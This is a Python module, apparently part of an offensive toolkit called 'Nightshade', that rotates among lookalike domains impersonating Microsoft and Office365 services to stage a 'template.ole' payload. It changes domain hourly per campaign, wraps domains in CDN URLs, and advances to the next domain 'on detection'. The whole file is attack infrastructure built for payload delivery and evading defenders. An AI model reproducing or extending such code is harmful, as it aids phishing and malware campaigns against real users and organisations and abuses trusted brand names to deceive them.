"""
Nightshade Domain Rotation.
Manages multiple staging domains and CDN distribution for OPSEC.
"""
import random
import time
import hashlib


class DomainRotator:
    """Rotate through staging domains using time-based selection + campaign hashing."""

    # Realistic-but-fake staging domains
    DEFAULT_DOMAINS = [
        "cdn.microsoft-update.com",
        "assets-windows.net",
        "secure-download.office365.com",
        "template-store.azurewebsites.net",
        "static-cdn.office.net",
        "update-service.windows.com",
        "download.microsoft-ews.com",
        "content-delivery.office365.net",
    ]

    CDN_PROVIDERS = [
        "https://{domain}.cloudfront.net",
        "https://{domain}.azureedge.net",
        "https://{domain}.fastly.net",
    ]

    def __init__(self, domains: list[str] | None = None, campaign_id: str = "default"):
        self._domains = domains or list(self.DEFAULT_DOMAINS)
        self._campaign_id = campaign_id

    def _campaign_seed(self, timestamp: int) -> int:
        """Deterministic-but-unique index based on campaign + time window."""
        window = timestamp // 3600  # rotate every hour
        seed_str = f"{self._campaign_id}:{window}"
        return int(hashlib.sha256(seed_str.encode()).hexdigest(), 16)

    def current_domain(self) -> str:
        """Get the current staging domain based on time + campaign hash."""
        idx = self._campaign_seed(int(time.time())) % len(self._domains)
        return self._domains[idx]

    def template_url(self, endpoint: str = "template.ole") -> str:
        domain = self.current_domain()
        return f"https://{domain}/{endpoint}"

    def next_domain(self) -> str:
        """Force-advance to next domain (for rotation on detection)."""
        idx = self._domains.index(self.current_domain())
        next_idx = (idx + 1) % len(self._domains)
        return self._domains[next_idx]

    def rotate(self):
        """Advance the rotation window so current domain changes."""
        # No-op: current_domain uses time-based hashing, so it rotates naturally.

    def cdn_url(self, domain: str | None = None) -> str:
        """Wrap a domain in a CDN URL for distribution."""
        d = domain or self.current_domain()
        provider = random.choice(self.CDN_PROVIDERS)
        return provider.format(domain=d)

    def add_domain(self, domain: str):
        if domain not in self._domains:
            self._domains.append(domain)

    def remove_domain(self, domain: str):
        if domain in self._domains:
            self._domains.remove(domain)
